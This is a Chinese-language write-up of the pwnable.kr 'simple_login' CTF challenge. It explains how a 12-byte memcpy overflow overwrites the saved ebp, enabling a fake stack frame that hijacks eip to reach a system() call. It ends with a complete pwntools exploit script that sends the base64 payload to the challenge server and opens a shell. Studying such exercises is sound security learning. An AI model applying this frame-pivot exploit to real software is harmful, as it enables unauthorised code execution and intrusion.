---
title: pwnable.kr->Simple Login
categories: 
- pwnable.kr
---
# pwnable.kr->simple_login

## 前言

这个题目是从apple store那里看p4nda学长的wp来的，那道题最后用到了这个题的技巧，因此我也做了一下这个来加深记忆

## 程序逻辑

F5之后发现程序的逻辑比较简单，有一个bss段的全局变量input，输入限制长度为30，且根据函数名可以看到输入的数据应当是base64编码之后的结果，之后会先进行一次base64解码，判断解码长度不大于12，在进入auth函数把输入的解码结果memcpy到v4，这里是漏洞的触发点，v4地址为ebp-8，但是输入最长可以是12，因此可以覆盖到ebp，但也只能覆盖ebp。程序里有system调用处，可以在Gdb里直接b*correct找到其地址

![main](./1.jpg)

![auth](./2.jpg)

![system](./3.jpg)

## 漏洞利用

这里一个知识点比较关键，我们假设调用函数为A，被调函数为B，则B函数的ebp的值实际上是A函数ebp的地址，因此我们覆盖B函数的ebp时填入一块假的内存块的地址，这个地址的值模拟ebp和返回地址及参数。当被调函数返回的时候ebp被Pop出来作为原函数的ebp地址，最终实现eip劫持

## exp.py

```py
#coding=utf-8
from pwn import *
import base64
context.update(arch='i386',os='linux',log_level="DEBUG")
context.terminal = ['tmux','split','-h']
debug = 0
if debug:
    p = process('./login')
    #gdb.attach(p,'b* 0x804929c')
else:
    p = remote('pwnable.kr',9003)

p.recvuntil('Authenticate : ')
payload = ''
shell_addr = 0x8049284
input_addr = 0x811EB40
payload = flat('aaaa',shell_addr,input_addr)
payload = base64.b64encode(payload)
p.sendline(payload)
p.recvline()
p.interactive()
```
